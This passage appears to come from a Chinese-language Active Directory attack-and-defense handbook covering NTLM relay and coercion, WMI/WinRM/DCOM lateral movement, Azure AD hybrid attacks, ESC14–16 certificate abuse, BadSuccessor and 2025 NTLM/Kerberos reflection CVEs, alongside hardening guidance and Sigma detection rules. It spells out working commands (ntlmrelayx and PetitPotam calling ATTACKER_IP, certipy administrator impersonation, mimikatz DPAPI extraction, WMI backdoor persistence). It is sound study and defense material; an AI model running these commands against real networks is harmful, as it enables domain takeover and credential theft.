方法              | 协议        | 需要认证 | 默认可用
------------------|-------------|----------|----------
PrinterBug        | MS-RPRN     | 是       | 是
PetitPotam        | MS-EFSRPC   | 否       | 是
ShadowCoerce      | MS-FSRVP    | 是       | 是
dfscoerce         | MS-DFSNM    | 否       | 是
NightMare         | MS-EVEN     | 否       | 是
ChefCoerce        | MS-RAA      | 否       | 否(默认禁用)
PullCoerce        | MS-SCMR     | 是       | 是
DFSPetit          | MS-DFSNM v2 | 否       | 是
```

#### 13.3 LDAP Signing 与 SMB Signing 绕过

```bash
# 检测目标 SMB Signing 状态
crackmapexec smb TARGETS --gen-relay-list smb_signing_disabled.txt
nmap --script smb2-security-mode -p 445 TARGET

# NTLM Relay 到 LDAP (创建 AD 对象)
ntlmrelayx.py -t ldap://DC_IP \
  --delegate-access \      # 自动配置 RBCD
  --add-computer ATTACK$   # 创建机器账户

# NTLM Relay 到 LDAPS (如果 LDAP Signing 已强制)
# LDAPS (端口 636) 不受 LDAP Signing 限制
ntlmrelayx.py -t ldaps://DC_IP --delegate-access

# NTLM Relay 到 AD CS
ntlmrelayx.py -t http://ADCS/certsrv/certfnsh.asp \
  -adcs --template "Machine" \
  -wh ATTACKER_IP  # 可配置 WebView 回连
```

---

### 14. 横向移动技术详解

#### 14.1 WMI 横向移动

```bash
# Impacket
impacket-wmiexec domain.com/admin:password@TARGET
impacket-wmiexec domain.com/admin@TARGET -hashes :NTHASH

# CrackMapExec
crackmapexec wmi TARGET -u admin -p password -x "whoami"
crackmapexec wmi TARGET -u admin -H NTHASH -x "whoami"

# PowerShell (内置)
Invoke-WmiMethod -Class Win32_Process -Name Create \
  -ArgumentList "cmd.exe /c whoami" \
  -ComputerName TARGET

# WMI Event Subscription (持久化 + 远程执行)
# EventFilter → EventConsumer → Binding
$filter = Set-WmiInstance -Class __EventFilter -Arguments @{
  Name = "BackdoorFilter"
  EventNameSpace = "root\cimv2"
  QueryLanguage = "WQL"
  Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
} -ComputerName TARGET
```

#### 14.2 WinRM 横向移动

```bash
# CrackMapExec
crackmapexec winrm TARGET -u admin -p password -x "whoami"

# evil-winrm (Ruby)
evil-winrm -i TARGET -u admin -p password
evil-winrm -i TARGET -u admin -H NTHASH

# PowerShell Remoting (内置)
Enter-PSSession -ComputerName TARGET -Credential domain\admin
Invoke-Command -ComputerName TARGET -ScriptBlock { whoami } -Credential domain\admin

# 检测:
# - Event ID 4624 LogonType 3 (WinRM 使用 HTTP)
# - Event ID 16962 (WinRM 操作)
# - 端口 5985 (HTTP) / 5986 (HTTPS)
```

#### 14.3 DCOM 横向移动

```powershell
# MMC20.Application
$dcom = [Type]::GetTypeFromProgID("MMC20.Application", "TARGET")
$obj = [Activator]::CreateInstance($dcom)
$obj.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c calc.exe", "7")

# ShellWindows
$dcom = [Type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", "TARGET")
$obj = [Activator]::CreateInstance($dcom)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:", "open", 0)

# Excel.Application
$dcom = [Type]::GetTypeFromProgID("Excel.Application", "TARGET")
$obj = [Activator]::CreateInstance($dcom)
$obj.DisplayAlerts = $false
# 通过 Excel 宏执行命令

# 检测:
# - Event ID 4624 LogonType 3 (DCOM 使用 NTLM)
# - Event ID 10001 (DCOM 激活)
# - DcomLaunch 服务日志
```

#### 14.4 PSRemoting 横向移动

```powershell
# 基本用法
Enter-PSSession -ComputerName TARGET -Credential domain\admin

# 多目标执行
Invoke-Command -ComputerName TARGET1, TARGET2 -ScriptBlock {
  whoami
  Get-Process
} -Credential domain\admin

# CredSSP 认证（双重跳转）
Enable-WSManCredSSP -Role Client -DelegateComputer TARGET
Enter-PSSession -ComputerName TARGET -Authentication CredSSP -Credential domain\admin

# 检测:
# - Event ID 4624 LogonType 3
# - PowerShell ScriptBlock Logging (Event ID 4104)
# - Windows PowerShell Operational Log
```

#### 14.5 横向移动方法对比

| 方法 | 协议/端口 | 需要权限 | 隐蔽性 | 检测难度 |
|------|----------|---------|--------|---------|
| PSExec | SMB/445 | 本地管理员 | 低 | 低 |
| WMI | DCOM/135 | 本地管理员 | 中 | 中 |
| WinRM | HTTP/5985 | 本地管理员/远程管理 | 中 | 中 |
| DCOM | DCOM/135 | 本地管理员 | 高 | 高 |
| PSRemoting | HTTP/5985 | 远程管理 | 中 | 中 |
| SSH | TCP/22 | 用户账户 | 高 | 低 |
| Scheduled Task | SMB/445 | 本地管理员 | 中 | 中 |

---

### 15. Azure AD / Entra ID 攻击

#### 15.1 混合身份攻击（On-Prem → Cloud）

```bash
# === Azure AD Connect 同步攻击 ===

# 1. 找到 Azure AD Connect 服务器
Get-DomainComputer -Identity "AADConnect*" | select Name

# 2. 提取 MSOL_ 账户凭据（本地存储）
# 该账户有 DCSync 权限 + Azure AD 的目录同步账户权限
# DPAPI 解密:
mimikatz "dpapi::cred /in:C:\Program Files\Microsoft Azure AD Sync\Binance\SyncCredentials"

# 3. 使用 MSOL_ 账户同步密码哈希到 Azure AD
# PHS (Password Hash Sync) → 本地 DPAPI → 提取 Azure AD 凭据

# === PTA (Pass-Through Authentication) 代理后门 ===
# 在 PTA 代理服务器上:
# 修改 AzureADConnectAuthenticationAgentService.exe
# 插入后门: 所有认证请求都返回成功
```

#### 15.2 Entra ID 原生攻击

```bash
# === Token 窃取 ===
# 从已登录用户的浏览器/进程中提取 Access Token / Refresh Token
# 工具: AADInternals, ROADtools

# ROADtools
roadrecon auth -u user@domain.com -p password
roadrecon gather -t ACCESS_TOKEN
roadrecon gui  # Web GUI 查看

# AADInternals (PowerShell)
Import-Module AADInternals
Get-AADIntAccessToken -ClientId "1b730954-1685-4b74-9bfd-dac224a7b0de" -Tenant "domain.com"

# === 条件访问绕过 ===
# 1. 设备码钓鱼 (Device Code Phishing)
# 2. Token Relay 攻击
# 3. 利用合法云应用的委扈权限

# === Teams / SharePoint 信息收集 ===
# 通过 Graph API 枚举:
# /users → 所有用户
# /groups → 所有组
# /sites → SharePoint 站点
# /chats → Teams 聊天
```

#### 15.3 Cloud → On-Prem 攻击路径

```
攻击路径:
1. 获取 Entra ID Global Admin
2. 利用 Azure AD Connect (PHS/PTA) → 同步到本地 AD
3. 或通过 Intune → 部署脚本到域计算机
4. 或通过 Azure AD Domain Services → LDAP 攻击

防御:
- 保护 Global Admin 账户 (MFA, PIM, Conditional Access)
- 使用 Privileged Identity Management (PIM) 进行 Just-In-Time 访问
- 分离云管理账户与本地管理账户
- 监控 Azure AD 审计日志中的异常活动
```

---

### 16. AD 防御加固 (2025 更新)

#### 16.1 Tier Model 深度实施

```
┌──────────────────────────────────────────────────┐
│ Tier 0: 企业标识控制                              │
│   - 域控制器                                      │
│   - AD CS 服务器                                  │
│   - Azure AD Connect 服务器                       │
│   - PKI 基础设施                                  │
│   - 管理: 仅通过 PAW (专用管理工作站)              │
│   - 账户: 独立的 Tier 0 管理账户                  │
│   - 禁止: Tier 0 账户登录 Tier 1/2 机器           │
│   - 禁止: 非特权账户访问 Tier 0 服务器             │
├──────────────────────────────────────────────────┤
│ Tier 1: 服务器管理                                │
│   - 文件/打印/应用服务器                           │
│   - 数据库服务器                                   │
│   - 管理: 独立 Tier 1 管理工作站                   │
│   - 账户: 独立的 Tier 1 管理账户                  │
│   - 禁止: Tier 1 账户登录工作站                    │
├──────────────────────────────────────────────────┤
│ Tier 2: 工作站管理                                │
│   - 用户工作站/笔记本                              │
│   - Helpdesk 操作                                  │
│   - 仅限工作站管理权限                              │
└──────────────────────────────────────────────────┘

实施要点:
- 每个层级使用独立的管理账户 (命名约定: T0-admin-xxx, T1-admin-xxx)
- GPO 强制登录限制
- 使用 Administrative Tier Model GPO 模板
- 网络分段: Tier 0 仅允许特定 IP 访问
```

#### 16.2 PAW (Privileged Access Workstation)

```
PAW 架构:
1. 硬件隔离: 物理独立的管理工作站
2. 或虚拟化隔离: 在专用 Hyper-V 虚拟机中管理

PAW 安全策略:
- 禁止浏览互联网
- 禁止安装非白名单软件
- 禁止访问电子邮件
- 仅允许连接到 Tier 0/1 服务器
- 全磁盘加密 (BitLocker)
- 启用 Credential Guard
- 启用 Remote Credential Guard
- 使用 Smart Card / FIDO2 认证

2025 增强:
- Windows 11 + Pluton 安全芯片
- Windows Hello for Business (无密码)
- Local Administrator Password Solution (LAPS) v2
```

#### 16.3 Windows LAPS (LAPS v2)

```powershell
# Windows LAPS (内置于 Windows Server 2025 / Windows 11 24H2+)
# 替代旧版 Microsoft LAPS

# 启用 Windows LAPS
# GPO: Computer Configuration → Administrative Templates → System → LAPS
# - Enable LAPS: Enabled
# - Password Settings: Complexity, Length (25+), Age (24h)

# 或通过 Intune 策略部署

# 查询密码 (需要权限)
Get-LapsADPassword -ComputerName TARGET

# 重置密码
Reset-LapsPassword -ComputerName TARGET

# 备份密码到 Azure (混合场景)
Set-LapsADComputerSelfPermission -Identity "OU=Computers,DC=domain,DC=com"
```

#### 16.4 Windows Server 2025 AD 安全增强

```
1. Kerberos 增强:
   - 强制 AES-256 加密 (默认禁用 RC4)
   - KDC 加强: PAC 验证改进
   - Kerberos Armoring (FAST) 默认启用

2. 安全 RPC:
   - RPC 加密级别提升
   - EPA (Extended Protection for Authentication) 默认启用

3. LDAP 强化:
   - LDAP 签名默认要求
   - Channel Binding Token 默认启用
   - LDAP 查询签名验证

4. NTLM 限制:
   - NTLMv1 完全移除
   - NTLM 审计模式可配置

5. Credential Guard:
   - 默认启用 (VBS 环境)
   - LSASS 保护增强

6. 新 Event ID:
   - 更细粒度的 Kerberos 事件日志
   - ADCS 操作审计增强
   - RBCD 操作审计
```

#### 16.5 2025 加固优先级清单

| 措施 | 优先级 | 防御的攻击 | Windows Server 2025 状态 |
|------|--------|-----------|-------------------------|
| 启用 LDAP 签名 + CBT | P0 | LDAP Relay / NTLM Relay | 默认启用 |
| 禁用 NTLMv1 | P0 | NTLM Relay | 默认禁用 |
| 强制 SMB Signing | P0 | SMB Relay | 可配置 |
| 部署 Windows LAPS v2 | P0 | 横向移动 | 内置 |
| 启用 EPA on AD CS | P0 | ESC8 PetitPotam | 默认启用 |
| 禁用 RC4 Kerberos | P0 | Kerberoasting | 默认禁用 |
| 审计 ADCS 模板 | P1 | ESC1-ESC15 | 手动 |
| 实施 Tier Model | P1 | 全链路 | 手动 |
| 部署 PAW | P1 | 凭据窃取 | 手动 |
| 启用 Credential Guard | P1 | LSASS Dump | VBS 环境默认 |
| 保护 krbtgt (双密码滚动) | P1 | Golden Ticket | 手动 |
| 启用 Kerberos Armoring | P2 | Kerberos 离线攻击 | 默认启用 |
| 部署 Microsoft Entra ID Protection | P2 | 混合攻击 | 需许可证 |
| 限制 DCOM/WMI 远程访问 | P2 | 横向移动 | 手动 |
| 审计 GPO 权限 | P2 | GPO 滥用 | 手动 |

---

### 17. 更新 MITRE ATT&CK 映射 (2025)

| Tactic | Technique | ID | 对应攻击 |
|--------|-----------|-----|---------|
| Initial Access | Valid Accounts | T1078 | 密码喷洒 |
| Discovery | Remote System Discovery | T1018 | LDAP/SMB 枚举 |
| Discovery | Domain Trust Discovery | T1482 | BloodHound CE |
| Discovery | Permission Groups Discovery | T1069 | PowerView/AD Module |
| Credential Access | Kerberoasting | T1558.003 | GetUserSPNs/Rubeus |
| Credential Access | AS-REP Roasting | T1558.004 | GetNPUsers/Rubeus |
| Credential Access | OS Credential Dumping | T1003.001 | LSASS Dump (Mimikatz) |
| Credential Access | OS Credential Dumping | T1003.006 | DCSync |
| Credential Access | NTLM Relay | T1557.001 | ntlmrelayx |
| Credential Access | Steal Web Session Cookie | T1539 | Token 窃取 |
| Credential Access | Modify Authentication Process | T1556 | Skeleton Key |
| Credential Access | Forge Kerberos Tickets | T1558.001 | Golden/Diamond Ticket |
| Credential Access | Forged Credentials | T1606.001 | Silver/Purple Ticket |
| Credential Access | Unsecured Credentials | T1552 | DPAPI/LSA Secrets |
| Lateral Movement | Pass the Hash | T1550.002 | PTH |
| Lateral Movement | Pass the Ticket | T1550.003 | PTT/Kerberos |
| Lateral Movement | Remote Services: SMB | T1021.002 | PSExec/SMB |
| Lateral Movement | Remote Services: WMI | T1021.001 | WMIExec |
| Lateral Movement | Remote Services: DCOM | T1021.003 | DCOM |
| Lateral Movement | Remote Services: WinRM | T1021.006 | WinRM/PSRemoting |
| Lateral Movement | Internal Spearphishing | T1534 | 内部钓鱼 |
| Privilege Escalation | Access Token Manipulation | T1134 | Token Impersonation |
| Privilege Escalation | Domain Policy Modification | T1484 | GPO 滥用 |
| Privilege Escalation | Exploitation of Priv. Esc. | T1068 | ACL/ADCS/RBCD |
| Privilege Escalation | Certificate Abuse | - | ESC1-ESC15/Shadow Credentials |
| Persistence | Account Manipulation | T1098 | AdminSDHolder/DSRM |
| Persistence | Domain Trust Modification | T1484.002 | SID History |
| Persistence | Create Account | T1136 | 机器账户创建 |
| Persistence | Additional Cloud Credentials | T1098.001 | Azure AD 后门 |
| Defense Evasion | Indicator Removal | T1070 | 日志清除 |
| Defense Evasion | Process Injection | T1055 | LSASS 注入 |
| Exfiltration | Over Alternative Protocol | T1048 | DNS 隧道 |

---

### 18. 工具更新 (2025)

| 工具 | 类型 | 2025 状态 | 说明 |
|------|------|----------|------|
| BloodHound CE | 侦察 | 活跃维护 | 替代旧版，无需 Neo4j |
| Certipy | ADCS | 活跃维护 | 支持 ESC1-ESC15 |
| Impacket | 全链路 | 活跃维护 | 新增 coercer 集成 |
| CrackMapExec | 枚举/横向 | 被 NetExec 替代 | NetExec = CME 的活跃 fork |
| NetExec | 枚举/横向 | 活跃维护 | 支持 AES Kerberos |
| Rubeus | Kerberos | 活跃维护 | 支持 Shadow Credentials |
| Whisker | Shadow Credentials | 活跃维护 | msDS-KeyCredentialLink |
| Mimikatz | 凭据提取 | 低频更新 | 仍然必备 |
| Coercer | 认证强制 | 活跃维护 | 自动枚举所有 coercion 方法 |
| PetitPotam | EFSRPC | 活跃维护 | 多种变体 |
| evil-winrm | WinRM | 活跃维护 | 支持 Kerberos/AES |
| ROADtools | Azure AD | 活跃维护 | Entra ID 枚举 |
| AADInternals | Azure AD | 活跃维护 | Azure/混合攻击 |
| ldapdomaindump | LDAP | 活跃维护 | LDAP 枚举 |

---

---

## Part D：2025-2026 重大更新补充

> 本部分涵盖 2025 年下半年至 2026 年初 AD 安全领域的重大技术突破，
> 包括 ESC16 证书滥用、BadSuccessor dMSA 提权、NTLM 反射/认证绕过关键 CVE、
> BloodHound CE v8 OpenGraph 架构、Windows Server 2025 防御变更。

---

### 19. ESC16 — CA 安全扩展全局禁用

**发现时间**: 2025 年（Certipy ly4k / SpecterOps 分类）

**原理**: CA（证书颁发机构）上禁用了 SID 安全扩展（`szOID_SID_SECURITY_EXTENSIONS`），导致所有颁发的证书缺少 SID 扩展，削弱了强证书映射能力。攻击者可利用此配置缺陷冒充特权用户。

**条件**: CA 全局配置中禁用了安全扩展 + `StrongCertificateBindingEnforcement` 未强制。

```bash
# 枚举 ESC16 — 检查 CA 是否禁用安全扩展
certipy find -u user@domain.com -p password -dc-ip DC_IP -vulnerable

# 利用：请求证书（缺少 SID 扩展 → 可用于身份冒充）
certipy req -u user@domain.com -p password -ca "CA-NAME" \
  -template "User" \
  -upn "administrator@domain.com"

# 使用证书认证
certipy auth -pfx administrator.pfx -dc-ip DC_IP

# Metasploit 辅助模块（ESC9/ESC10/ESC16 通用）
use auxiliary/admin/dcerpc/esc_update_ldap_object
```

**StrongCertificateBindingEnforcement 时间线**:
- 2025 年 2 月: 全局强制启用（默认）
- 2025 年 9 月: 注册表键永久不受支持（Microsoft 移除禁用能力）

**检测**:
```yaml
# 检查 CA 是否颁发不含 SID 扩展的证书
# Event ID 4887 — 证书颁发记录
# 对比证书 SAN 与实际请求者身份
title: ESC16 - Certificate Without SID Extension
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4887
  condition: selection
level: medium
tags:
  - attack.t1649
```

**防御**:
1. 确保 CA 启用 SID 安全扩展
2. 在 DC 上设置 `StrongCertificateBindingEnforcement = 2`（完全强制）
3. 注册表路径: `HKLM\System\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement`

---

### 19b. ESC14 — NTAuthCertificates 滥用

**原理**: `CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,...` 是存储「哪些 CA 证书可签发认证证书」的全局信任对象。攻击者若能写入该对象（或让受控 CA 的证书被加入），即可让自己签发的证书被域认证信任，从而冒充任意用户（含域管理员）。

**条件**: 攻击者对 NTAuthCertificates 对象有 WriteProperty / GenericWrite，或控制一个已被信任的 CA。

```bash
# 枚举 ESC14 — 检查当前用户是否可写 NTAuthCertificates
# Certipy 较新版本在 find 输出中标注 ESC14
certipy find -u user@domain.com -p password -dc-ip DC_IP -vulnerable

# 手动枚举（PowerShell / ADSI）
# 检查 Configuration 分区下 NTAuthCertificates 的 ACL
Get-ACL "AD:\CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com" |
  Select-Object -ExpandProperty Access | Where-Object { $_.ActiveDirectoryRights -match "Write" }

# 利用：将攻击者 CA 证书加入 NTAuthCertificates → 用该 CA 签发管理员证书 → PKINIT
# 1) 生成/复用攻击者 CA
# 2) 写入 cACertificate 到 NTAuthCertificates
# 3) 用攻击者 CA 签发 userPrincipalName=administrator@domain.com 的证书
# 4) certipy auth 或 gettgtpkinit.py 用该证书取 TGT/NT 哈希
```

**检测**:
```yaml
# Event ID 5136 — NTAuthCertificates 对象修改
# 目标 DN: CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration
title: ESC14 - NTAuthCertificates Modification
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5136
    ObjectDN|contains: 'CN=NTAuthCertificates'
  condition: selection
level: high
tags:
  - attack.t1649
```

**防御**: 1) 收紧 NTAuthCertificates ACL（仅 PKI 管理员）2) 监控 5136 对 NTAuthCertificates 的写入 3) 定期审计受信任 CA 证书清单。

---

### 19c. ESC15 — 跨域 PKI 信任滥用

**原理**: 多林/多域 PKI 环境下，A 林信任 B 林的 CA（B 林 CA 证书进入 A 林的 NTAuthCertificates）。攻击者若控制 B 林的（子）CA，可为 A 林主体签发证书，实现跨林提权。本质是「CA 信任传递」——证书信任跨越了安全边界。

**条件**: 存在跨林/跨域 CA 信任；攻击者控制受信任侧的 CA 或可签发证书的模板。

```bash
# 枚举跨域信任与 PKI 信任关系
# 1) 列出域信任
nltest /domain_trusts
Get-ADTrust -Filter *

# 2) 枚举 CA 与信任的 CA 证书（确认跨林 CA 是否被信任）
certipy find -u user@domain.com -p password -dc-ip DC_IP -vulnerable

# 3) 若控制受信任 CA：签发目标林主体证书
#    certipy req 用受控 CA/模板，SAN 指向目标林管理员 UPN
#    → certipy auth / PKINIT 取目标林 TGT
```

**检测**:
```yaml
# Event ID 4887 — 证书颁发；关注「CA 与请求主体跨林」的异常组合
# 跨林认证需额外核对请求主体与 CA 归属林是否一致
title: ESC15 - Cross-Forest Certificate Request
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4887
  condition: selection
level: medium
tags:
  - attack.t1649
```

**防御**: 1) 收敛跨林 CA 信任（按最小信任）2) 审计 NTAuthCertificates 中的外部 CA 3) 对跨林证书请求加额外审批 4) 参考 ESC16 的强证书映射强制。

---

### 20. BadSuccessor — dMSA 提权攻击（Windows Server 2025）

**发现者**: Akamai 安全研究团队
**影响范围**: 所有 Windows Server 2025 域控制器
**补丁状态**: 截至 2025 年 6 月，尚无官方 CVE 修复

**原理**: Windows Server 2025 引入了 Delegated Managed Service Accounts（dMSA）新功能。Akamai 发现 dMSA 的权限模型存在设计缺陷，攻击者可以利用 dMSA 的委派机制冒充 AD 中的任何用户（包括 Domain Admins），实现完整的域接管。

**攻击链**:

```
1. 攻击者获取普通域用户权限
2. 利用 dMSA 创建/滥用委派托管服务账户
3. 通过 dMSA 的 Kerberos 委派机制请求目标用户的 TGT
4. 获取 Domain Admin 权限
5. 完整域接管（DCSync / Golden Ticket）
```

**检测与防御**:

```powershell
# 检测: 查找异常的 dMSA 创建
Get-ADObject -LDAPFilter "(objectClass=msDS-DelegatedManagedServiceAccount)" -Properties *

# 检测: 审计 dMSA 委派权限变更
# Event ID 5136 — 目录对象修改
# 目标属性: msDS-ManagedAccountPrecededByLink, msDS-DelegatedMSA-Blind

# 缓解措施 (Semperis 建议):
# 1. 限制 dMSA 创建权限（仅限 Tier 0 管理员）
# 2. 监控 msDS-DelegatedManagedServiceAccount 对象的创建和修改
# 3. 限制 dMSA 可委派的目标范围
# 4. 部署 Tier Model 分层（dMSA 仅用于 Tier 0/1 服务）
```

**Sigma 检测规则**:

```yaml
title: Potential BadSuccessor dMSA Abuse
logsource:
  product: windows
  service: security
detection:
  selection_create:
    EventID: 5136
    ObjectClass: 'msDS-DelegatedManagedServiceAccount'
  selection_modify:
    EventID: 5136
    AttributeLDAPDisplayName|contains:
      - 'msDS-ManagedAccountPrecededByLink'
      - 'msDS-DelegatedMSA-Blind'
  condition: selection_create or selection_modify
level: high
tags:
  - attack.t1098
  - attack.t1068
```

**来源**: Akamai Blog / Semperis 防御指南 / Palo Alto Unit 42 分析

---

### 21. CVE-2025-54918 — NTLM LDAP 认证绕过

**发现者**: Tal Kahana（CrowdStrike）
**发现时间**: 2025 年 9 月
**CVSS**: 8.8（High）
**类型**: Windows NTLM 认证不当（CWE: Improper Authentication）
**影响**: 域用户 → SYSTEM → DCSync（完整域沦陷）

**原理**: NTLM 反射（reflection）攻击的演进，攻击者可以将认证中继回域控制器自身，通过 LDAP 提升权限。该漏洞绕过了传统的 NTLM 反射缓解措施。

**攻击链**:

```bash
# 完整攻击流程 (授权测试用):
# 1. 创建 DNS 记录指向攻击者控制的服务器
dnstool.py -u 'domain.com\user' -p 'password' -r attacker.domain.com -d ATTACKER_IP --action add DC_IP

# 2. 强制域控制器认证到攻击者
# 使用 PetitPotam / PrinterBug / 其他 coercion 方法
python3 PetitPotam.py ATTACKER_IP DC_IP

# 3. NTLM 反射 → LDAP 提权
ntlmrelayx.py -t ldap://DC_IP --remove-mic

# 4. 修改 ACL / 创建用户 / DCSync
# 最终获取域管理员权限
```

**检测**:

```yaml
title: CVE-2025-54918 - NTLM Reflection to LDAP
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID|contains:
      - 4624
    AuthenticationPackageName: NTLM
    LogonType: 3
    TargetUserName|contains: '$'
  timeframe: 5m
  condition: selection | count() > 5
level: critical
tags:
  - attack.t1557
  - attack.t1068
```

**缓解**:
1. 安装 Microsoft 安全更新
2. 启用 LDAP 通道绑定（Channel Binding Token）
3. 强制 LDAP 签名
4. 考虑禁用 NTLM 并迁移至 Kerberos

**来源**: CrowdStrike Blog / CVE.org CVSS 8.8 / PoC: github.com/Wh0am123/CVE-2025-54918-POC

---

### 22. CVE-2025-33073 — NTLM 反射 SMB 提权

**严重性**: High
**类型**: Windows SMB 访问控制不当
**核心突破**: 移除了 NTLM 中继攻击对管理员权限的前置要求

**原理**: NTLM 反射是将认证中继回发起认证的同一台机器。CVE-2025-33073 绕过了 NTLM 反射缓解措施，允许已认证的域内攻击者通过 SMB 将 NTLM 认证反射回自身，从而提升权限。

**关键影响**:
- 即使启用了 SMB 签名，也可能不足以防御
- 攻击者只需要普通域用户权限
- 可在域内横向移动链中使用

**攻击流程（简化）**:

```bash
# 1. 利用 CVE-2025-33073 反射 NTLM 到目标自身
# 2. 通过 Kerberos 冒充获取目标机器的 admin 权限
# Ghost SPN 技巧：利用不存在的 SPN 触发 NTLM 回退
# 3. 在目标机器上获取 SYSTEM 权限
# 4. 提取凭据 → 横向移动 → 域管

# Synacktiv 深度分析:
# CVE-2025-33073 是一个逻辑漏洞，而非缓冲区溢出
# 利用 SMB 客户端的访问控制缺陷
```

**补丁后仍需关注（Semperis 研究）**:
- 即使应用了 CVE-2025-33073 补丁
- Kerberos 反射仍可被滥用（Ghost SPN 技术）
- 需要额外的配置加固

**Sigma 检测**:

```yaml
title: CVE-2025-33073 - NTLM Reflection via SMB
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4624
    LogonType: 3
    AuthenticationPackageName: NTLM
  filter_source:
    IpAddress|contains:
      - '127.0.0.1'
      - '::1'
  condition: selection and filter_source
level: high
tags:
  - attack.t1557.001
  - attack.t1210
```

**来源**: Praetorian / Synacktiv 深度分析 / Semperis Ghost SPN / Depth Security

---

### 22b. Kerberos 中继 / 反射（2025 前沿）

**来源**: <https://blog.syss.com/posts/kerberos-reflection/> · Reflective Kerberos Relay 零日（Varutra Threatpost）

**原理**: NTLM Relay/Reflection 的 2025 演进——攻击者把认证中继/反射到**目标机器自身**，且协议从 NTLM 扩展到 **Kerberos**。核心链条：machine account 强制认证（coercion）→ 触发 Kerberos 认证 → 将 Kerberos 服务票据（AP-REQ）反射回发起机器自身或中继到 SMB 服务 → 以目标机身份建立会话提权。Ghost SPN 技巧是关键前置：利用不存在的 SPN 触发目标机的 Kerberos 回退/中继路径。

**与 NTLM Relay 的分界**:
| 维度 | NTLM Relay | Kerberos Relay/Reflection |
|---|---|---|
| 认证协议 | NTLMSSP（NetNTLMv2） | Kerberos（AP-REQ/服务票据） |
| 中继目标 | LDAP/SMB/HTTP | SMB（及自身反射） |
| 前置要求 | 目标未强制签名/通道绑定 | 普通域用户 + coercion + SMB 客户端配置 |
| 经典缓解 | SMB 签名 / LDAP 签名+CBT / EPA | 补丁 + 严格票据校验 + 禁用回退 |

```bash
# 攻击链（授权测试；对齐 CVE-2025-33073 / Ghost SPN 思路）
# 1) 触发目标机 machine account 强制认证（coercion）
python3 PetitPotam.py ATTACKER_IP TARGET_IP   # 或其他 coercion 方法

# 2) Kerberos 反射/中继到目标自身 SMB（2025 Reflective Kerberos Relay）
#    - 核心：让目标 SMB 客户端接受反射回的 Kerberos 服务票据
#    - Ghost SPN：构造不存在 SPN，迫使 Kerberos 回退/绕开票据校验

# 3) 以目标机身份建立 SMB 会话 → SYSTEM → 提取凭据/横向
```

**检测**:
```yaml
title: Kerberos Reflection via SMB (2025)
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4624
    LogonType: 3
    AuthenticationPackageName: Kerberos
  filter_source:
    IpAddress|contains:
      - '127.0.0.1'
      - '::1'
  condition: selection and filter_source
level: high
tags:
  - attack.t1557
  - attack.t1558
```

**防御**: 1) 安装 CVE-2025-33073 相关补丁 2) 收紧 SMB 客户端接受中继票据的行为 3) 监控「Kerberos 登录源 IP 为环回地址」的异常组合 4) 禁用不必要的 NTLM/Kerberos 回退。

**参考**: [syss.com Kerberos Reflection](https://blog.syss.com/posts/kerberos-reflection/) · [Reflective Kerberos Relay 零日](https://www.varutra.com/ctp/index.php/threatpost/postDetails/Reflective-Kerberos-Relay-Attack:-A-New-Zero-Day-Threat-to-Windows-SMB-Client/YVp5Q1AxTm1IZ0l6UnFFYSt2cGhwZz09)

---

### 23. BloodHound CE v8 — OpenGraph 架构

**发布时间**: 2025 年 7 月（SpecterOps）

**架构变化**:

```
BloodHound CE v7:
  SharpHound → API Server (Go) → Web UI (React)
  仅支持 AD / Entra ID 数据源

BloodHound CE v8 + OpenGraph:
  任意数据源 → OpenGraph API → BloodHound 可视化
  - 支持任何身份系统（Okta, AWS IAM, GitHub, ServiceNow...）
  - RESTful API 接收自定义关系数据
  - 攻击路径可视化跨平台追踪
  - ADCS 攻击路径原生支持（新增边类型）
```

**关键新特性**:

```
1. OpenGraph Framework:
   - 定义自定义节点和边
   - 导入任意平台的关系数据
   - 跨平台攻击路径分析
   - REST API: POST /api/v2/graphs/{graph_id}/edges

2. ADCS 攻击路径增强:
   - 新增 ADCS 边类型（Enroll, AutoEnroll, CertificateTemplate, CA）
   - 可视化 ESC1-ESC16 利用路径
   - 在攻击路径图中标注证书模板滥用

3. BloodHound Scentry:
   - 攻击路径咨询服务
   - 帮助组织加速 APM（Attack Path Management）实践

4. 混合环境支持:
   - AD + Entra ID + 第三方身份提供商
   - 跨域攻击路径追踪
```

**数据采集更新**:

```bash
# SharpHound v2（推荐）
SharpHound.exe -c all -d domain.com
SharpHound.exe -c all --searchforest
SharpHound.exe -c DCOnly         # 无需域管权限

# BloodHound CE Python Collector
bloodhound-ce-python -d domain.com -u user -p pass -ns DC_IP -c All

# OpenGraph 自定义数据导入
# 通过 API 导入非 AD 数据源
curl -X POST http://bloodhound:8080/api/v2/graphs \
  -H "Authorization: Bearer TOKEN" \
  -d '{"name": "okta-identity", "nodes": [...], "edges": [...]}'
```

---

### 24. Windows Server 2025 NTLM Relay 防御变更

**来源**: Microsoft MSRC / decoder.cloud / SpecterOps / Hive Security

**默认安全增强（WS2025 域控制器）**:

```
1. LDAP 通道绑定（Channel Binding）:
   - 默认启用
   - LDAPS 连接需要 CBT（Channel Binding Token）
   - 影响: 经典 cross-DC coerce + relay to LDAPS 失效

2. LDAP 签名:
   - 默认强制要求
   - 注册表: LDAPServerIntegrity = 2

3. SMB 签名:
   - 域控制器默认要求 SMB 签名
   - 影响: SMB 中继攻击路径被阻断

4. LDAP SASL Bind Sealing:
   - 默认要求加密（sealing）
   - 影响: 纯 NTLM 中继到 LDAP 失效

5. EPA (Extended Protection for Authentication):
   - AD CS HTTP 端点默认启用
   - 影响: PetitPotam → ESC8 攻击链失效

6. Kerberos Armoring (FAST):
   - 默认启用
   - 影响: Kerberos 离线攻击难度增加

7. NTLMv1:
   - 完全移除
```

**攻击者应对策略（仍可利用的场景）**:

```
Windows Server 2025 中 NTLM Relay 仍可行的场景:
